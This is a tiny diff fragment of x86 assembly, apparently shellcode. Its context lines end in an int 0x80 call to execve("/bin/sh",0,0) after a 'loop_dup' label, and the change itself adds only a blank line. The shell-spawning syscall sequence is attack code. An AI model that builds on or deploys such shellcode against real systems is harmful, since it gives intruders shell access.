@@ -79,3 +79,4 @@ loop_dup:
 	mov edx, eax		; Set edx to 0
 	mov al, 0xb		; Set eax to 11
 	int 0x80		; Make the syscall execve("/bin/sh",0,0)
+	
